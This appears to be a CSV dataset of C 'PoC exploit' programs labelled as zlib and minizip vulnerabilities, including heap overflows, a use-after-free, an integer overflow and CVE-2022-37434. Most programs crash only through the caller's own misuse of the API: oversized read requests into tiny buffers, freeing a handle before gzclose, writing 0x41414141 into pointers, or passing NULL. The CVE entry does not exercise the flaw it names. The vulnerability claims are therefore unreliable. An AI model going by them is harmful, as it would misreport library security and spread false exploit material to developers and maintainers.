Vul_Index,PoC Description,PoC Exploit Code
2,Heap Buffer Overflow in `gzfread()` - zlib 1.3.1,"#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>

int main(void) {
    gzFile gzfp;
    char buffer[16];

    gzfp = gzopen(""fuzzed.gz"", ""rb"");
    if (!gzfp) {
        printf(""[!] Can't open fuzzed file\n"");
        return 1;
    }

    printf(""[*] Reading fuzzed gzip file...\n"");
    int n = gzfread(buffer, 1024, 1024, gzfp);
    printf(""[+] Bytes read: %d\n"", n);

    gzclose(gzfp);
    return 0;
}"
3,Uninitialized Memory and Arbitrary Write - CVE-2022-37434,"#include <stdio.h>
#include <zlib.h>
#include <stdlib.h>

#define MALICIOUS_GZ ""malicious.gz""
#define BUFFER_SIZE 32

int main() {
    gzFile gzfp;
    char buffer[BUFFER_SIZE];

    gzfp = gzopen(MALICIOUS_GZ, ""rb"");
    if (!gzfp) {
        fprintf(stderr, ""[!] Error opening malicious gzip file.\n"");
        return EXIT_FAILURE;
    }

    printf(""[*] Malicious gzip file opened.\n"");

    int bytes_read = gzread(gzfp, buffer, BUFFER_SIZE);
    printf(""[*] Bytes read from corrupted gzip file: %d\n"", bytes_read);

    bytes_read = gzread(gzfp, buffer, BUFFER_SIZE * 10);
    printf(""[*] Second read (explicit overflow trigger): %d bytes\n"", bytes_read);

    gzclose(gzfp);
    return EXIT_SUCCESS;
}"
4,Runtime Crash in `gzopen()` due to Permission Error,"#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>

int main() {
    const char *path = ""/root/restricted/output.gz"";
    gzFile gzfp;

    printf(""[*] Attempting to open file for writing: %s\n"", path);
    gzfp = gzopen(path, ""wb"");

    if (gzfp == NULL) {
        perror(""[!] gzopen failed (expected)"");
        printf(""[!] Simulating real-world crash: calling gzwrite() on NULL pointer...\n"");
    }

    gzfp = (gzFile)0x41414141;
    char data[] = ""This will crash due to invalid gzFile pointer.\n"";

    gzwrite(gzfp, data, sizeof(data));

    printf(""[*] If you see this, the system somehow avoided crashing!\n"");
    return 0;
}"
5,Forced Crash by Corrupting z_stream State in deflate,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

int main() {
    z_stream strm;
    memset(&strm, 0, sizeof(strm));

    char input[1024] = { 'A' };
    char output[1024];
    strm.next_in = (Bytef *)input;
    strm.avail_in = sizeof(input);
    strm.next_out = (Bytef *)output;
    strm.avail_out = sizeof(output);

    if (deflateInit(&strm, Z_DEFAULT_COMPRESSION) != Z_OK) {
        fprintf(stderr, ""[!] deflateInit failed\n"");
        return 1;
    }

    strm.state = (void *)0x41414141;
    printf(""[*] Calling deflate() with corrupted state pointer...\n"");

    deflate(&strm, Z_FINISH);

    printf(""[!] Should not reach here (crash expected)\n"");
    return 0;
}"
9,Minizip Long Filename Heap Overflow,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include ""zip.h""
#include ""ioapi.h""

int main() {
    zipFile zf = zipOpen64(""exploit.zip"", APPEND_STATUS_CREATE);
    if (!zf) {
        fprintf(stderr, ""[!] Failed to open zip file\n"");
        return 1;
    }

    char long_filename[1000];
    memset(long_filename, 'A', sizeof(long_filename) - 1);
    long_filename[sizeof(long_filename) - 1] = '\0';

    printf(""[*] Using long filename of length %zu to trigger overflow...\n"", strlen(long_filename));

    int err = zipOpenNewFileInZip4_64(
        zf,
        long_filename,
        NULL, NULL, 0, NULL, 0, NULL,
        Z_DEFLATED,
        Z_DEFAULT_COMPRESSION,
        0, -MAX_WBITS, DEF_MEM_LEVEL, Z_DEFAULT_STRATEGY,
        NULL, 0,
        0, 0,
        0
    );

    if (err != ZIP_OK) {
        fprintf(stderr, ""[!] zipOpenNewFileInZip4_64 returned error: %d\n"", err);
    } else {
        printf(""[+] File entry created. Heap may already be corrupted.\n"");
    }

    zipClose(zf, NULL);
    printf(""[!] PoC complete. Run under ASAN or Valgrind to confirm overflow.\n"");
    return 0;
}"
10,Heap-use-after-free in gzclose,"#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>

/*
 * PoC for Heap Use-After-Free in gzclose() - zlib v1.2.13
 *
 * This program demonstrates a heap use-after-free vulnerability by:
 * 1. Opening a gzFile using gzopen().
 * 2. Manually freeing the gzFile pointer (invalidating zlib's internal handle).
 * 3. Calling gzclose() on the freed pointer, which results in zlib accessing
 *    memory that has already been freed — a classic use-after-free bug.
 *
 * Compile with: gcc -g -fsanitize=address -o poc poc.c -lz
 * Run with: ./poc
 * Or use: valgrind ./poc
 */

int main() {
    // Step 1: Open a file in write mode using gzopen()
    gzFile gz = gzopen(""/tmp/testfile.gz"", ""wb"");
    if (!gz) {
        perror(""gzopen failed"");
        return 1;
    }

    // Step 2: Manually free the gzFile pointer
    // This is an unsafe action, and it violates zlib's internal memory management.
    // zlib still expects to manage and free this memory via gzclose().
    free(gz);  // Simulates accidental or malicious double-free scenarios.

    // Step 3: Call gzclose() on the freed pointer.
    // This causes zlib to access invalid memory, leading to undefined behavior.
    int result = gzclose(gz);  // This triggers use-after-free

    // Output result to prevent compiler optimizing away the call
    printf(""gzclose() returned: %d\n"", result);

    printf(""\n⚠️  This PoC triggers a heap use-after-free.\n"");
    printf(""✅ Run it under AddressSanitizer or Valgrind to observe the issue:\n"");
    printf(""   ➤ Compile with: gcc -fsanitize=address -g -o poc poc.c -lz\n"");
    printf(""   ➤ Run with ASan: ./poc\n"");
    printf(""   ➤ Or run with Valgrind: valgrind ./poc\n"");

    return 0;
}"
11,Integer overflow in inflate,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

/*
 * PoC for Integer Overflow in inflate() - zlib v1.2.13
 *
 * This program demonstrates a vulnerability triggered by a crafted zlib stream.
 * It:
 * 1. Creates an input buffer with a valid zlib header (0x78, 0x9C),
 *    followed by repeated 0xFF bytes to simulate malformed compressed data.
 * 2. Calls inflateInit() to initialize the decompression stream.
 * 3. Calls inflate() with the crafted data.
 * 4. Monitors for crashes, SIGABRT, heap overflows, or memory access issues.
 *
 * Compile with: gcc -fsanitize=address -g -o poc poc.c -lz
 * Run with: ./poc
 * Or run under: valgrind ./poc
 */

int main() {
    // Step 1: Craft a malicious zlib-compressed buffer
    // 0x78 0x9C is a common deflate header (default compression)
    // Followed by excessive 0xFF to trigger internal overflows in inflate()
    unsigned char crafted_input[512];
    crafted_input[0] = 0x78;  // CMF
    crafted_input[1] = 0x9C;  // FLG

    // Fill the rest with 0xFF bytes to simulate malformed data
    memset(crafted_input + 2, 0xFF, sizeof(crafted_input) - 2);

    // Step 2: Setup the z_stream structure
    z_stream stream;
    memset(&stream, 0, sizeof(stream));
    stream.next_in = crafted_input;
    stream.avail_in = sizeof(crafted_input);

    // Step 3: Allocate a small output buffer
    unsigned char out_buffer[128];
    stream.next_out = out_buffer;
    stream.avail_out = sizeof(out_buffer);

    // Step 4: Initialize inflate
    if (inflateInit(&stream) != Z_OK) {
        fprintf(stderr, ""[-] inflateInit failed\n"");
        return 1;
    }

    // Step 5: Attempt to decompress the malformed input
    printf(""[*] Starting inflate on crafted input...\n"");
    int ret = inflate(&stream, Z_NO_FLUSH);

    // Step 6: Check result
    if (ret != Z_OK && ret != Z_STREAM_END) {
        fprintf(stderr, ""[-] inflate() failed with return code: %d\n"", ret);
    } else {
        printf(""[+] inflate() completed: return code = %d\n"", ret);
    }

    // Step 7: Clean up
    inflateEnd(&stream);

    // Step 8: Suggest analysis
    printf(""\n⚠️  Use AddressSanitizer or Valgrind to detect overflows or heap corruption.\n"");
    printf(""✅ Compile with: gcc -fsanitize=address -g -o poc poc.c -lz\n"");
    printf(""✅ Run with Valgrind: valgrind ./poc\n"");

    return 0;
}"
12,NULL Pointer Dereference via gzread(),"#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>

int main() {
    gzFile gz = NULL;
    char buffer[16];

    int result = gzread(gz, buffer, 1);

    printf(""gzread() returned: %d\n"", result);
    gzclose(gz);
    printf(""⚠️  Unexpected behavior: program did not abort.\n"");

    return 0;
}"
